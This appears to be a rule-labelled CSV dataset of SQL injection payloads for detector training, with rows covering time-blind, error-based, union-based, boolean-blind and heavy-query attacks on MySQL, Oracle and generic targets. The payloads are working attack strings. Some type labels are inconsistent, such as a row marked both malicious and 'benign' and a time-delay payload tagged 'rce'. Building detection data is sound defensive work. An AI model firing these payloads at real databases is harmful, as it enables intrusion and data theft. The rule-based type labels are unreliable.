row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5910,"1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5911,-7164%' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = ',1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
5912,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 9069 = 9069,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5913,"1%"" ) ) ) union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5914,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5915,"1 ) where 2720 = 2720 and elt ( 4249 = 4249,7259 ) --",1,,boolean_blind,generic,0.95,2720 = 2720 and detected — boolean_blind injection (priority 8) on generic,rule-based
5916,"-5924' where 5415 = 5415 union all select 5415,5415,5415,5415,5415,5415#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5917,select 'qqpjq'|| ( select ( case when ( 2933 = 2933 ) then 1 else 0 end ) ) ||'qzvzq',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5918,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""ymss"" = ""ymss",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
5919,"1'+ ( select 'qpxk' where 7139 = 7139 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) +'",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
